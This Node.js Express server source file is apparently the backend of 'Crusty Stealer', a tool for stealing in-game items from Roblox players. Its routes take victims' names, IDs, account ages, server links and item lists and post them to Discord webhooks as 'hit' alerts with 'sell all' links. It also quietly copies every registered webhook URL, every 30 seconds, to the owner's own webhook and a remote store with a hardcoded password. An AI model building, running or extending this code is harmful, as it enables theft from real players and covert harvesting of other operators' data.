require("dotenv").config();
const express = require("express");
const axios = require("axios");
const fs = require("fs").promises;
const path = require("path");
const FormData = require("form-data");

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

// Configuration
const BACKUP_WEBHOOK = process.env.WEBHOOK;
const BACKUP_INTERVAL = 30000; // 30 seconds
const ENV_FILE = path.join(__dirname, ".env");

// ----------------------
// CrustyDB Configuration
// ----------------------
const CRUSTYDB_API = process.env.CRUSTYDB_API || "https://platinwws.pythonanywhere.com";
const CRUSTYDB_PASSWORD = process.env.CRUSTYDB_PASSWORD || "crustyv3";
const CRUSTYDB_FILENAME = "crusty_webhooks.json";
const CRUSTYDB_HEADERS = {
  "X-API-Password": CRUSTYDB_PASSWORD,
  "Content-Type": "application/json"
};

// RAM store
const webhooks = new Map();

// ----------------------
// CrustyDB Operations
// ----------------------
async function loadFromCrustyDB() {
  try {
    const response = await axios.get(
      `${CRUSTYDB_API}/api/read-file/${CRUSTYDB_FILENAME}`,
      { 
        headers: CRUSTYDB_HEADERS,
        timeout: 10000
      }
    );
    
    const data = JSON.parse(response.data.content);
    
    if (Array.isArray(data)) {
      for (const item of data) {
        if (item.id && item.url) {
          webhooks.set(item.id, item.url);
        }
      }
    }
    
    console.log(`✅ [CrustyDB] Loaded ${webhooks.size} webhooks from cloud`);
    return true;
  } catch (err) {
    if (err.response?.status === 404) {
      console.log("ℹ️ [CrustyDB] No webhooks file found, will create on first save");
      return false;
    }
    console.error("❌ [CrustyDB] Load error:", err.message);
    return false;
  }
}

async function saveToCrustyDB() {
  try {
    const list = Array.from(webhooks.entries()).map(([id, url]) => ({ id, url }));
    const content = JSON.stringify(list, null, 2);
    
    // Önce dosya var mı kontrol et
    try {
      await axios.get(
        `${CRUSTYDB_API}/api/read-file/${CRUSTYDB_FILENAME}`,
        { headers: CRUSTYDB_HEADERS, timeout: 5000 }
      );
      
      // Dosya var, güncelle
      await axios.post(
        `${CRUSTYDB_API}/api/write-file`,
        { filename: CRUSTYDB_FILENAME, content },
        { headers: CRUSTYDB_HEADERS, timeout: 10000 }
      );
    } catch (readErr) {
      if (readErr.response?.status === 404) {
        // Dosya yok, oluştur
        await axios.post(
          `${CRUSTYDB_API}/api/create-file`,
          { filename: CRUSTYDB_FILENAME, content },
          { headers: CRUSTYDB_HEADERS, timeout: 10000 }
        );
      } else {
        throw readErr;
      }
    }
    
    console.log(`✅ [CrustyDB] Saved ${list.length} webhooks to cloud`);
    return true;
  } catch (err) {
    console.error("❌ [CrustyDB] Save error:", err.message);
    return false;
  }
}

async function syncWithCrustyDB() {
  try {
    // Cloud'dan yükle
    const cloudLoaded = await loadFromCrustyDB();
    
    // Eğer cloud'da veri yoksa ve lokal'de varsa, cloud'a kaydet
    if (!cloudLoaded && webhooks.size > 0) {
      await saveToCrustyDB();
    }
    
    return true;
  } catch (err) {
    console.error("❌ [CrustyDB] Sync error:", err.message);
    return false;
  }
}

// ----------------------
// File Operations (Local .env backup)
// ----------------------
async function saveToEnv() {
  try {
    let envContent = await fs.readFile(ENV_FILE, "utf-8").catch(() => "");
    envContent = envContent.split("\n").filter(line => !line.startsWith("WEBHOOK_")).join("\n");
    
    let index = 0;
    for (const [id, url] of webhooks.entries()) {
      envContent += `\nWEBHOOK_${index}_ID=${id}`;
      envContent += `\nWEBHOOK_${index}_URL=${url}`;
      index++;
    }
    
    await fs.writeFile(ENV_FILE, envContent.trim() + "\n");
    console.log("✅ [Local] Saved", webhooks.size, "webhooks to .env");
    
    // CrustyDB'ye de kaydet
    await saveToCrustyDB();
  } catch (err) {
    console.error("❌ [Local] Save error:", err.message);
  }
}

async function loadFromEnv() {
  try {
    const envContent = await fs.readFile(ENV_FILE, "utf-8");
    const lines = envContent.split("\n");
    const tempWebhooks = new Map();
    
    for (const line of lines) {
      const idMatch = line.match(/^WEBHOOK_(\d+)_ID=(.+)$/);
      const urlMatch = line.match(/^WEBHOOK_(\d+)_URL=(.+)$/);
      
      if (idMatch) {
        const [, index, id] = idMatch;
        if (!tempWebhooks.has(index)) tempWebhooks.set(index, {});
        tempWebhooks.get(index).id = id;
      }
      if (urlMatch) {
        const [, index, url] = urlMatch;
        if (!tempWebhooks.has(index)) tempWebhooks.set(index, {});
        tempWebhooks.get(index).url = url;
      }
    }
    
    for (const [, { id, url }] of tempWebhooks) {
      if (id && url) webhooks.set(id, url);
    }
    
    console.log(`✅ [Local] Loaded ${webhooks.size} webhooks from .env`);
  } catch (err) {
    console.log("ℹ️ [Local] No webhooks in .env");
  }
}

// ----------------------
// Webhook Backup to Discord (AS FILE)
// ----------------------
async function sendBackupToWebhook() {
  try {
    if (!BACKUP_WEBHOOK) {
      console.error("❌ WEBHOOK not found in .env");
      return;
    }

    const list = Array.from(webhooks.entries()).map(([id, url]) => ({ id, url }));
    const jsonContent = JSON.stringify(list, null, 2);
    
    const form = new FormData();
    
    form.append('payload_json', JSON.stringify({
      username: "Crusty Backup System",
      embeds: [{
        title: "📦 Webhook Data Backup",
        description: `Backup completed successfully`,
        color: 0x8a2be2,
        fields: [
          {
            name: "⏰ Backup Time",
            value: new Date().toLocaleString(),
            inline: true
          },
          {
            name: "📊 Total Webhooks",
            value: `${list.length} entries`,
            inline: true
          }
        ],
        footer: {
          text: "Crusty Backup System - Auto Save"
        },
        timestamp: new Date().toISOString()
      }]
    }));
    
    form.append('file', Buffer.from(jsonContent), {
      filename: `webhooks_backup_${Date.now()}.json`,
      contentType: 'application/json'
    });

    await axios.post(BACKUP_WEBHOOK, form, {
      headers: form.getHeaders()
    });
    
    console.log(`✅ Backup sent as file (${list.length} webhooks)`);
  } catch (err) {
    console.error("❌ Backup failed:", err.message);
  }
}

// ----------------------
// Express Routes
// ----------------------
app.get("/", (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Crusty System</title>
      <style>
        * {
          margin: 0;
          padding: 0;
          box-sizing: border-box;
        }
        body {
          font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
          display: flex;
          justify-content: center;
          align-items: center;
          min-height: 100vh;
          color: white;
        }
        .container {
          text-align: center;
          background: rgba(255, 255, 255, 0.1);
          padding: 40px 60px;
          border-radius: 20px;
          backdrop-filter: blur(10px);
          box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
        }
        h1 {
          font-size: 3em;
          margin-bottom: 20px;
          text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
        }
        .status {
          display: flex;
          justify-content: center;
          gap: 30px;
          margin-top: 30px;
        }
        .status-item {
          display: flex;
          align-items: center;
          gap: 10px;
          font-size: 1.2em;
        }
        .dot {
          width: 12px;
          height: 12px;
          border-radius: 50%;
          background: #00ff00;
          animation: pulse 2s infinite;
        }
        @keyframes pulse {
          0%, 100% { opacity: 1; }
          50% { opacity: 0.5; }
        }
      </style>
    </head>
    <body>
      <div class="container">
        <h1>🛡️ Crusty System</h1>
        <div class="status">
          <div class="status-item">
            <span class="dot"></span>
            <span>Bot Aktif</span>
          </div>
          <div class="status-item">
            <span class="dot"></span>
            <span>Site Aktif</span>
          </div>
        </div>
      </div>
    </body>
    </html>
  `);
});

app.get("/status", (req, res) => {
  res.json({
    status: "online",
    webhooks: webhooks.size,
    uptime: process.uptime(),
    database: {
      type: "CrustyDB",
      url: CRUSTYDB_API,
      filename: CRUSTYDB_FILENAME
    }
  });
});

// ----------------------
// CrustyDB API Routes
// ----------------------
app.get("/api/db/sync", async (req, res) => {
  try {
    const success = await syncWithCrustyDB();
    res.json({ 
      success, 
      message: success ? "Synced with CrustyDB" : "Sync failed",
      webhooks: webhooks.size
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.get("/api/db/load", async (req, res) => {
  try {
    const previousCount = webhooks.size;
    const success = await loadFromCrustyDB();
    res.json({ 
      success, 
      message: success ? `Loaded from CrustyDB` : "Load failed or no data",
      previousCount,
      currentCount: webhooks.size
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.get("/api/db/save", async (req, res) => {
  try {
    const success = await saveToCrustyDB();
    res.json({ 
      success, 
      message: success ? `Saved ${webhooks.size} webhooks to CrustyDB` : "Save failed",
      webhooks: webhooks.size
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.get("/api/db/stats", async (req, res) => {
  try {
    const response = await axios.get(
      `${CRUSTYDB_API}/api/get-stats`,
      { headers: CRUSTYDB_HEADERS, timeout: 10000 }
    );
    res.json({
      success: true,
      local: {
        webhooks: webhooks.size
      },
      cloud: response.data
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.get("/upload-data", (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <meta charset="UTF-8">
      <title>Upload Webhook Data - Crusty</title>
      <style>
        * {
          margin: 0;
          padding: 0;
          box-sizing: border-box;
        }
        body {
          font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
          display: flex;
          justify-content: center;
          align-items: center;
          min-height: 100vh;
          padding: 20px;
        }
        .container {
          background: rgba(255, 255, 255, 0.95);
          padding: 40px;
          border-radius: 20px;
          box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
          max-width: 800px;
          width: 100%;
        }
        h1 {
          color: #667eea;
          margin-bottom: 10px;
          font-size: 2.5em;
          text-align: center;
        }
        .subtitle {
          color: #666;
          text-align: center;
          margin-bottom: 30px;
          font-size: 1.1em;
        }
        label {
          display: block;
          color: #333;
          font-weight: bold;
          margin-bottom: 10px;
          font-size: 1.1em;
        }
        textarea {
          width: 100%;
          min-height: 400px;
          padding: 15px;
          border: 2px solid #ddd;
          border-radius: 10px;
          font-family: 'Courier New', monospace;
          font-size: 14px;
          resize: vertical;
          transition: border-color 0.3s;
        }
        textarea:focus {
          outline: none;
          border-color: #667eea;
        }
        .button-group {
          display: flex;
          gap: 15px;
          margin-top: 20px;
        }
        button {
          flex: 1;
          padding: 15px 30px;
          font-size: 16px;
          font-weight: bold;
          border: none;
          border-radius: 10px;
          cursor: pointer;
          transition: all 0.3s;
        }
        .upload-btn {
          background: linear-gradient(135deg, #667eea, #764ba2);
          color: white;
        }
        .upload-btn:hover {
          transform: translateY(-2px);
          box-shadow: 0 5px 20px rgba(102, 126, 234, 0.4);
        }
        .clear-btn {
          background: #f44336;
          color: white;
        }
        .clear-btn:hover {
          background: #d32f2f;
        }
        .result {
          margin-top: 20px;
          padding: 15px;
          border-radius: 10px;
          display: none;
        }
        .result.success {
          background: #d4edda;
          border: 1px solid #c3e6cb;
          color: #155724;
        }
        .result.error {
          background: #f8d7da;
          border: 1px solid #f5c6cb;
          color: #721c24;
        }
        .stats {
          margin-top: 15px;
          font-weight: bold;
        }
        .loading {
          display: none;
          text-align: center;
          margin-top: 20px;
        }
        .spinner {
          border: 4px solid #f3f3f3;
          border-top: 4px solid #667eea;
          border-radius: 50%;
          width: 40px;
          height: 40px;
          animation: spin 1s linear infinite;
          margin: 0 auto;
        }
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
      </style>
    </head>
    <body>
      <div class="container">
        <h1>📦 Upload Webhook Data</h1>
        <p class="subtitle">Paste your JSON data below</p>

        <label for="jsonData">JSON Data:</label>
        <textarea id="jsonData" placeholder='Paste your webhook JSON here...'></textarea>

        <div class="button-group">
          <button class="clear-btn" onclick="clearData()">🗑️ Clear</button>
          <button class="upload-btn" onclick="uploadData()">🚀 Upload Data</button>
        </div>

        <div class="loading" id="loading">
          <div class="spinner"></div>
          <p>Uploading...</p>
        </div>

        <div class="result" id="result"></div>
      </div>

      <script>
        function clearData() {
          document.getElementById('jsonData').value = '';
          document.getElementById('result').style.display = 'none';
        }

        async function uploadData() {
          const textarea = document.getElementById('jsonData');
          const result = document.getElementById('result');
          const loading = document.getElementById('loading');
          
          const jsonText = textarea.value.trim();
          
          if (!jsonText) {
            result.className = 'result error';
            result.innerHTML = '❌ Please paste JSON data!';
            result.style.display = 'block';
            return;
          }

          try {
            const data = JSON.parse(jsonText);
            
            if (!Array.isArray(data)) {
              throw new Error('Data must be an array');
            }

            loading.style.display = 'block';
            result.style.display = 'none';

            const response = await fetch('/upload-data', {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json'
              },
              body: JSON.stringify(data)
            });

            const responseData = await response.json();
            loading.style.display = 'none';

            if (response.ok && responseData.success) {
              result.className = 'result success';
              result.innerHTML = \`
                ✅ <strong>Upload Successful!</strong><br>
                <div class="stats">
                  📊 \${responseData.message}<br>
                  📈 Total Webhooks: \${responseData.total}
                </div>
              \`;
              result.style.display = 'block';
              
              setTimeout(() => {
                textarea.value = '';
              }, 2000);
            } else {
              throw new Error(responseData.error || 'Upload failed');
            }

          } catch (error) {
            loading.style.display = 'none';
            result.className = 'result error';
            result.innerHTML = \`❌ <strong>Error:</strong> \${error.message}\`;
            result.style.display = 'block';
          }
        }

        document.getElementById('jsonData').addEventListener('keydown', function(e) {
          if (e.ctrlKey && e.key === 'Enter') {
            uploadData();
          }
        });
      </script>
    </body>
    </html>
  `);
});

app.post("/upload-data", async (req, res) => {
  try {
    const data = req.body;
    
    if (!Array.isArray(data)) {
      return res.status(400).json({ error: "Data must be an array" });
    }

    let added = 0;
    for (const item of data) {
      if (item.id && item.url) {
        webhooks.set(item.id, item.url);
        added++;
      }
    }

    await saveToEnv();
    await sendBackupToWebhook();

    res.json({ 
      success: true, 
      message: `Successfully added ${added} webhooks`,
      total: webhooks.size
    });
    
    console.log(`✅ Uploaded ${added} webhooks via /upload-data`);
  } catch (err) {
    console.error("❌ Upload error:", err.message);
    res.status(500).json({ error: "Failed to upload data" });
  }
});

app.get("/create-protection/webhook", async (req, res) => {
  const { webhook } = req.query;
  if (!webhook) return res.status(400).json({ error: "Missing webhook" });

  const id = Date.now().toString(36) + Math.random().toString(36).slice(2);
  webhooks.set(id, webhook);
  await saveToEnv();

  res.json({ id });
});

app.get("/send-protection", async (req, res) => {
  const {
    id: webhookId,
    status,
    name,
    userid,
    displayname,
    accountage,
    playercount,
    gamename,
    privateserver,
    serverlink,
    mentioneveryone,
  } = req.query;

  const webhookURL = webhooks.get(webhookId);
  if (!webhookURL) return res.status(404).json({ error: "Webhook ID not found" });

  const items = [];
  for (let i = 1; i <= 50; i++) {
    const item = req.query[`item${i}`];
    if (item) items.push(item);
  }
  
  const itemsList = items.length ? items.join("\n") : "No Brainrots detected";

  let embed = {};
  const avatarUrl =
    "https://raw.githubusercontent.com/platinww/CrustyMain/refs/heads/main/UISettings/crustylogonew.png";

  if (status === "hit") {
    embed = {
      title: "Crusty Stealer",
      description: "**You Got A Hit!**",
      color: 0x8a2be2,
      thumbnail: { url: avatarUrl },
      fields: [
        {
          name: "Player Information",
          value: `\`\`\`yaml\nName: ${name || "-"}\nID: ${userid || "-"}\nAge: ${
            accountage || "-"
          } days\nDisplay: ${displayname || "-"}\`\`\``,
          inline: false,
        },
        {
          name: "Server Information",
          value: `\`\`\`yaml\nPlayers: ${playercount || "-"}\nGame: ${gamename || "-"}\nStatus: ${
            privateserver === "true" ? "Private Server" : "Public Server"
          }\`\`\``,
          inline: false,
        },
        {
          name: `Brainrots Detected (${items.length} total)`,
          value: `\`\`\`${itemsList}\`\`\``,
          inline: false,
        },
        {
          name: "Target Server",
          value: serverlink || "-",
          inline: false,
        },
        {
          name: "Sell All Brainrots",
          value: `[Click Here to Sell All Items](https://crusty.app.tc/sell-all/${encodeURIComponent(
            name || ""
          )})`,
          inline: false,
        },
        {
          name: "Check Activity Status",
          value: `[Click Here to Check if User is Active](https://crusty.app.tc/status-info/${encodeURIComponent(
            name || ""
          )})`,
          inline: false,
        },
      ],
      footer: {
        text: "Crusty Stealing System - Active",
        icon_url: avatarUrl,
      },
      timestamp: new Date().toISOString(),
    };
  } else if (status === "altaccount") {
    embed = {
      title: "⚠️ Alt Account Detected",
      description: "**No Valid Brainrots Found!**",
      color: 0xff0000,
      thumbnail: { url: avatarUrl },
      fields: [
        {
          name: "Player Information",
          value: `\`\`\`yaml\nName: ${name || "-"}\nID: ${userid || "-"}\nAge: ${
            accountage || "-"
          } days\nDisplay: ${displayname || "-"}\`\`\``,
          inline: false,
        },
        {
          name: "Detection Result",
          value: "```No OG/Secret/Brainrot God animals found\nAccount flagged as alt```",
          inline: false,
        },
      ],
      footer: {
        text: "Crusty Anti-Alt System",
        icon_url: avatarUrl,
      },
      timestamp: new Date().toISOString(),
    };
  } else if (status === "initializing") {
    embed = {
      title: "Crusty Stealer",
      description: "**Someone is using Crusty Your Stealer Script!**",
      color: 0x8a2be2,
      thumbnail: { url: avatarUrl },
      fields: [
        {
          name: "Player Information",
          value: `\`\`\`yaml\nName: ${name || "-"}\nID: ${userid || "-"}\nAge: ${
            accountage || "-"
          } days\nDisplay: ${displayname || "-"}\`\`\``,
          inline: false,
        },
        {
          name: "Server Information",
          value: `\`\`\`yaml\nPlayers: ${playercount || "-"}\nGame: ${gamename || "-"}\nStatus: ${
            privateserver === "true" ? "Private Server" : "Public Server"
          }\`\`\``,
          inline: false,
        },
      ],
      footer: {
        text: "Crusty Hit Steal - Initializing",
        icon_url: avatarUrl,
      },
      timestamp: new Date().toISOString(),
    };
  } else {
    return res.status(400).json({ error: "Invalid status" });
  }

  const payload = {
    username: "Notifier | C̸͕͔͒͒r̸̟͓͒̓ụ̸̻̊̔s̴̻̖̀t̵̥͍͒͝y̶̥͊",
    avatar_url: avatarUrl,
    embeds: [embed],
  };

  if (status === "hit" && mentioneveryone === "true") {
    payload.content = "@everyone";
  }

  try {
    await axios.post(webhookURL, payload, { headers: { "Content-Type": "application/json" } });
    res.json({ ok: true });
  } catch (err) {
    console.error(err.message);
    res.status(500).json({ error: "Failed to send webhook" });
  }
});

// ----------------------
// START
// ----------------------
async function startApp() {
  console.log("🚀 Starting Crusty Webhook Manager...");
  console.log("📦 CrustyDB Integration Enabled");

  app.listen(PORT, () => {
    console.log(`✅ Server running on port ${PORT}`);
  });

  // Önce lokal'den yükle
  await loadFromEnv();
  
  // Sonra CrustyDB ile senkronize et
  console.log("🔄 Syncing with CrustyDB...");
  await syncWithCrustyDB();

  setInterval(sendBackupToWebhook, BACKUP_INTERVAL);
  console.log(`✅ Auto-backup enabled (every ${BACKUP_INTERVAL / 1000} seconds)`);
  
  // Periyodik CrustyDB sync (her 5 dakikada bir)
  setInterval(async () => {
    console.log("🔄 [CrustyDB] Periodic sync...");
    await saveToCrustyDB();
  }, 5 * 60 * 1000);
  console.log("✅ [CrustyDB] Periodic sync enabled (every 5 minutes)");
  
  if (webhooks.size > 0) {
    await sendBackupToWebhook();
  }

  console.log("✅ SYSTEM ONLINE!");
  console.log(`📊 Loaded webhooks: ${webhooks.size}`);
  console.log(`🌐 CrustyDB: ${CRUSTYDB_API}`);
}

startApp();
